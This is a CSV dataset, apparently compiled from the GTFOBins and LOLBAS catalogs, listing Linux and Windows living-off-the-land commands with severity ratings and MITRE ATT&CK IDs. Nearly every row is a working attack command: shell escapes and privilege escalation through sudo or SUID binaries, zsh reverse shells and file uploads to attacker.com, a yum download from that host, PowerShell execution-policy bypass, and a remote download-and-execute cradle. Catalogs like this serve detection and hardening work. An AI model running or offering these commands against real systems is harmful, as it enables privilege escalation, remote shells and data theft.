2016,Linux,wireshark,"Abuse the 'wireshark' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires GUI interaction. Start Wireshark, then from the main menu, select ""Tools"" -> ""Lua"" -> ""Evaluate"". A window opens that allows to execute Lua code.",Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/wireshark/
2017,Linux,wish,Abuse the 'wish' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/wish/
2018,Linux,wish,Abuse the 'wish' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/wish/
2019,Linux,wish,Abuse the 'wish' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/wish/
2020,Linux,xargs -a /path/to/input-file -0,Abuse the 'xargs' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/xargs/
2021,Linux,xargs -a /path/to/input-file -0,Abuse the 'xargs' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/xargs/
2022,Linux,xargs -a /path/to/input-file -0,Abuse the 'xargs' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/xargs/
2023,Linux,xargs -a /dev/null /bin/sh,Abuse the 'xargs' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/xargs/
2024,Linux,xargs -a /dev/null /bin/sh -p,Abuse the 'xargs' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/xargs/
2025,Linux,xargs -a /dev/null /bin/sh,Abuse the 'xargs' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/xargs/
2026,Linux,echo x | xargs -o -a /dev/null /bin/sh,Abuse the 'xargs' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/xargs/
2027,Linux,echo x | xargs -o -a /dev/null /bin/sh -p,Abuse the 'xargs' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/xargs/
2028,Linux,echo x | xargs -o -a /dev/null /bin/sh,Abuse the 'xargs' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/xargs/
2029,Linux,xdg-user-dir '}; /bin/sh #',Abuse the 'xdg-user-dir' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/xdg-user-dir/
2030,Linux,xdg-user-dir '}; /bin/sh #',Abuse the 'xdg-user-dir' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/xdg-user-dir/
2031,Linux,xdotool exec --sync /bin/sh,Abuse the 'xdotool' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/xdotool/
2032,Linux,xdotool exec --sync /bin/sh -p,Abuse the 'xdotool' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/xdotool/
2033,Linux,xdotool exec --sync /bin/sh,Abuse the 'xdotool' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/xdotool/
2034,Linux,xmodmap -v /path/to/input-file,Abuse the 'xmodmap' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is corrupted by error prints.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/xmodmap/
2035,Linux,xmodmap -v /path/to/input-file,Abuse the 'xmodmap' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The read file content is corrupted by error prints.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/xmodmap/
2036,Linux,xmodmap -v /path/to/input-file,Abuse the 'xmodmap' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is corrupted by error prints.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/xmodmap/
2037,Linux,xmore /path/to/input-file,Abuse the 'xmore' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is displayed in a graphical window.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/xmore/
2038,Linux,xmore /path/to/input-file,Abuse the 'xmore' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is displayed in a graphical window.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/xmore/
2039,Linux,xmore /path/to/input-file,Abuse the 'xmore' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is displayed in a graphical window.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/xmore/
2040,Linux,xpad -f /path/to/input-file,Abuse the 'xpad' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is displayed in a graphical window.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/xpad/
2041,Linux,xpad -f /path/to/input-file,Abuse the 'xpad' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is displayed in a graphical window.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/xpad/
2042,Linux,xpad -f /path/to/input-file,Abuse the 'xpad' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is displayed in a graphical window.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/xpad/
2043,Linux,xxd /path/to/input-file | xxd -r,Abuse the 'xxd' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/xxd/
2044,Linux,xxd /path/to/input-file | xxd -r,Abuse the 'xxd' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/xxd/
2045,Linux,xxd /path/to/input-file | xxd -r,Abuse the 'xxd' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/xxd/
2046,Linux,echo DATA | xxd | xxd -r - /path/to/output-file,Abuse the 'xxd' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/xxd/
2047,Linux,echo DATA | xxd | xxd -r - /path/to/output-file,Abuse the 'xxd' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/xxd/
2048,Linux,echo DATA | xxd | xxd -r - /path/to/output-file,Abuse the 'xxd' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/xxd/
2049,Linux,xz -c /path/to/input-file | xz -d,Abuse the 'xz' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/xz/
2050,Linux,xz -c /path/to/input-file | xz -d,Abuse the 'xz' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/xz/
2051,Linux,xz -c /path/to/input-file | xz -d,Abuse the 'xz' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/xz/
2052,Linux,yarn exec /bin/sh,Abuse the 'yarn' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/yarn/
2053,Linux,yarn exec /bin/sh,Abuse the 'yarn' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/yarn/
2054,Linux,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' >package.json yarn --cwd .",Abuse the 'yarn' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/yarn/
2055,Linux,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' >package.json yarn --cwd .",Abuse the 'yarn' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/yarn/
2056,Linux,"echo '{""scripts"": {""xxx"": ""/bin/sh""}}' >package.json yarn --cwd . xxx",Abuse the 'yarn' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/yarn/
2057,Linux,"echo '{""scripts"": {""xxx"": ""/bin/sh""}}' >package.json yarn --cwd . xxx",Abuse the 'yarn' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/yarn/
2058,Linux,yash,Abuse the 'yash' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/yash/
2059,Linux,yash,Abuse the 'yash' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/yash/
2060,Linux,yash,Abuse the 'yash' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/yash/
2061,Linux,yelp man:/path/to/input-file,Abuse the 'yelp' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This spawns a graphical window containing the file content somehow corrupted by word wrapping.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/yelp/
2062,Linux,yelp man:/path/to/input-file,Abuse the 'yelp' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This spawns a graphical window containing the file content somehow corrupted by word wrapping.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/yelp/
2063,Linux,yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #',Abuse the 'yt-dlp' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The URL must point to a valid YouTube video which will be actually downloaded.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/yt-dlp/
2064,Linux,yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #',Abuse the 'yt-dlp' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The URL must point to a valid YouTube video which will be actually downloaded.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/yt-dlp/
2065,Linux,yum localinstall -y x-1.0-1.noarch.rpm,Abuse the 'yum' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` echo /path/to/command >x.sh fpm -n x -s dir -t rpm -a all --before-install .x.sh . ```,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/yum/
2066,Linux,yum install http://attacker.com/path/to/input-file.rpm,"Abuse the 'yum' binary (download) in a sudo context to escalate privileges or execute arbitrary actions. The file on the remote host must have the `.rpm` extension, but the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp/yum-root-xxxxxx/`.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/yum/
2067,Linux,"cat >/path/to/temp-dir/x<<EOF [main] plugins=1 pluginpath=/path/to/temp-dir/ pluginconfpath=/path/to/temp-dir/ EOF cat >/path/to/temp-dir/y.conf<<EOF [main] enabled=1 EOF cat >/path/to/temp-dir/y.py<<EOF import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version='2.1' def init_hook(conduit): ... EOF yum -c /path/to/temp-dir/x --enableplugin=y",Abuse the 'yum' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/yum/
2068,Linux,zathura :! /bin/sh -c 'exec /bin/sh 0<&1',"Abuse the 'zathura' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The interaction happens in a GUI window, while the shell is dropped in the terminal.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/zathura/
2069,Linux,zathura :! /bin/sh -c 'exec /bin/sh 0<&1',"Abuse the 'zathura' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The interaction happens in a GUI window, while the shell is dropped in the terminal.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/zathura/
2070,Linux,zcat -f /path/to/input-file,Abuse the 'zcat' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/zcat/
2071,Linux,zcat -f /path/to/input-file,Abuse the 'zcat' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/zcat/
2072,Linux,echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file zic -d . -y /path/to/command /path/to/temp-file,Abuse the 'zic' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. This executes the command twice: - `/path/to/command 0 xxx` - `/path/to/command 1 xxx` Additionally the `Test` file is created.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/zic/
2073,Linux,echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file zic -d . -y /path/to/command /path/to/temp-file,Abuse the 'zic' binary (command) in a suid context to escalate privileges or execute arbitrary actions. This executes the command twice: - `/path/to/command 0 xxx` - `/path/to/command 1 xxx` Additionally the `Test` file is created.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/zic/
2074,Linux,echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file zic -d . -y /path/to/command /path/to/temp-file,Abuse the 'zic' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions. This executes the command twice: - `/path/to/command 0 xxx` - `/path/to/command 1 xxx` Additionally the `Test` file is created.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/zic/
2075,Linux,zip /path/to/temp-file /path/to/input-file unzip -p /path/to/temp-file,Abuse the 'zip' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/zip/
2076,Linux,zip /path/to/temp-file /path/to/input-file unzip -p /path/to/temp-file,Abuse the 'zip' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/zip/
2077,Linux,zip /path/to/temp-file /path/to/input-file unzip -p /path/to/temp-file,Abuse the 'zip' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/zip/
2078,Linux,zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #',Abuse the 'zip' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/zip/
2079,Linux,zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #',Abuse the 'zip' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/zip/
2080,Linux,zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #',Abuse the 'zip' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/zip/
2081,Linux,zless /path/to/input-file,Abuse the 'zless' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/zless/
2082,Linux,zless /path/to/input-file,Abuse the 'zless' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/zless/
2083,Linux,zless /path/to/input-file,Abuse the 'zless' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/zless/
2084,Linux,"zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n ""$(<&$REPLY)"" >/path/to/output-file'",Abuse the 'zsh' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/zsh/
2085,Linux,"zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n ""$(<&$REPLY)"" >/path/to/output-file'",Abuse the 'zsh' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/zsh/
2086,Linux,"zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n ""$(<&$REPLY)"" >/path/to/output-file'",Abuse the 'zsh' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/zsh/
2087,Linux,"zsh -c 'echo ""$(</path/to/input-file)""'",Abuse the 'zsh' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/zsh/
2088,Linux,"zsh -c 'echo ""$(</path/to/input-file)""'",Abuse the 'zsh' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/zsh/
2089,Linux,"zsh -c 'echo ""$(</path/to/input-file)""'",Abuse the 'zsh' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/zsh/
2090,Linux,zsh -c '</path/to/input-file',Abuse the 'zsh' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This spawns a pager if run in a TTY.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/zsh/
2091,Linux,zsh -c '</path/to/input-file',Abuse the 'zsh' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. This spawns a pager if run in a TTY.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/zsh/
2092,Linux,zsh -c '</path/to/input-file',Abuse the 'zsh' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This spawns a pager if run in a TTY.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/zsh/
2093,Linux,zsh -c 'echo DATA >/path/to/output-file',Abuse the 'zsh' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/zsh/
2094,Linux,zsh -c 'echo DATA >/path/to/output-file',Abuse the 'zsh' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/zsh/
2095,Linux,zsh -c 'echo DATA >/path/to/output-file',Abuse the 'zsh' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/zsh/
2096,Linux,zsh -c '</etc/hosts',Abuse the 'zsh' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/zsh/
2097,Linux,zsh -c '</etc/hosts',Abuse the 'zsh' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/zsh/
2098,Linux,zsh -c '</etc/hosts',Abuse the 'zsh' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/zsh/
2099,Linux,zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY',Abuse the 'zsh' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/zsh/
2100,Linux,zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY',Abuse the 'zsh' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/zsh/
2101,Linux,zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY',Abuse the 'zsh' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/zsh/
2102,Linux,zsh,Abuse the 'zsh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/zsh/
2103,Linux,zsh,Abuse the 'zsh' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/zsh/
2104,Linux,zsh,Abuse the 'zsh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/zsh/
2105,Linux,"zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n ""$(</path/to/input-file)"" >&$REPLY'",Abuse the 'zsh' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/zsh/
2106,Linux,"zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n ""$(</path/to/input-file)"" >&$REPLY'",Abuse the 'zsh' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/zsh/
2107,Linux,"zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n ""$(</path/to/input-file)"" >&$REPLY'",Abuse the 'zsh' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/zsh/
2108,Linux,zsoelim /path/to/input-file,Abuse the 'zsoelim' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The content is actually parsed and corrupted by the command.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/zsoelim/
2109,Linux,zsoelim /path/to/input-file,Abuse the 'zsoelim' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The content is actually parsed and corrupted by the command.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/zsoelim/
2110,Linux,zsoelim /path/to/input-file,Abuse the 'zsoelim' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The content is actually parsed and corrupted by the command.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/zsoelim/
2111,Linux,cp /bin/sh /usr/lib/zypper/commands/zypper-x zypper x,Abuse the 'zypper' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The copy usually requires elevated privileges.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/zypper/
2112,Linux,cp /bin/sh /usr/lib/zypper/commands/zypper-x zypper x,Abuse the 'zypper' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The copy usually requires elevated privileges.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/zypper/
2113,Linux,cp /bin/sh /path/to/temp-dir/zypper-x PATH=$PATH:/path/to/temp-dir/ zypper x,Abuse the 'zypper' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/zypper/
2114,Linux,cp /bin/sh /path/to/temp-dir/zypper-x PATH=$PATH:/path/to/temp-dir/ zypper x,Abuse the 'zypper' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/zypper/
2115,Windows,"C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe ""URL"" ""DESTINATION FILE""","GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by ""Microsoft Windows Hardware"", ""Compatibility Publisher"", ""Microsoft Windows Third Party Component CA 2012"", ""Microsoft Time-Stamp PCA 2010"", ""Microsoft Time-Stamp Service"".",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/GfxDownloadWrapper/
2116,Windows,"code.exe tunnel --accept-server-license-terms --name ""tunnel-name""",Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command,Execute,Critical,T1219.001,https://lolbas-project.github.io/lolbas/Binaries/code/
2117,Windows,powershell.exe -ep bypass -file c:\path\to\a\script.ps1,Set the execution policy to bypass and execute a PowerShell script without warning,Execute,Critical,T1059.001,https://lolbas-project.github.io/lolbas/Binaries/Powershell/
2118,Windows,"powershell.exe -ep bypass -command ""Invoke-AllTheThings...""",Set the execution policy to bypass and execute a PowerShell command,Execute,Critical,T1059.001,https://lolbas-project.github.io/lolbas/Binaries/Powershell/
2119,Windows,powershell.exe -ep bypass -ec IgBXAGUAIAA8ADMAIABMAE8ATABCAEEAUwAiAA==,Set the execution policy to bypass and execute a very malicious PowerShell encoded command,Execute,Critical,T1059.001,https://lolbas-project.github.io/lolbas/Binaries/Powershell/
2120,Windows,powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe},"Execute binaries from the context of the signed script using the ""VsWherePath"" flag.",Execute,Critical,T1216,https://lolbas-project.github.io/lolbas/Binaries/Launch-VsDevShell.ps1/
2121,Windows,"powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath ""/../../../../../; {PATH:.exe} ;""","Execute binaries and commands from the context of the signed script using the ""VsInstallationPath"" flag.",Execute,Critical,T1216,https://lolbas-project.github.io/lolbas/Binaries/Launch-VsDevShell.ps1/
2122,Windows,. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1 \nSyncInvoke {CMD},Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable.,Execute,Critical,T1216,https://lolbas-project.github.io/lolbas/Binaries/CL_Invocation.ps1/
2123,Windows,"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",Inject PowerShell script code with the provided arguments,Execute,Critical,T1216.002,https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver.vbs/
2124,Windows,pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct},Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection,Execute,Critical,T1216.001,https://lolbas-project.github.io/lolbas/Binaries/Pubprn.vbs/
2125,Windows,. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1 \nrunAfterCancelProcess {PATH:.ps1},Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable.,Execute,Critical,T1216,https://lolbas-project.github.io/lolbas/Binaries/CL_Mutexverifiers.ps1/
2126,Windows,set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf,Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.,Execute,Critical,T1216,https://lolbas-project.github.io/lolbas/Binaries/Manage-bde.wsf/
2127,Windows,copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf,Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.,Execute,Critical,T1216,https://lolbas-project.github.io/lolbas/Binaries/Manage-bde.wsf/
2128,Windows,"powershell.exe -ep bypass -command ""set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()""",Proxy execute Managed DLL with PowerShell,Execute,Critical,T1216,https://lolbas-project.github.io/lolbas/Binaries/CL_LoadAssembly.ps1/
2129,Windows,"Pester.bat [/help|?|-?|/?] ""$null; {CMD}""",Execute code using Pester. The third parameter can be anything. The fourth is the payload.,Execute,Critical,T1216,https://lolbas-project.github.io/lolbas/Binaries/Pester.bat/
2130,Windows,Pester.bat ;{PATH:.exe},Execute code using Pester. Example here executes specified executable.,Execute,Critical,T1216,https://lolbas-project.github.io/lolbas/Binaries/Pester.bat/
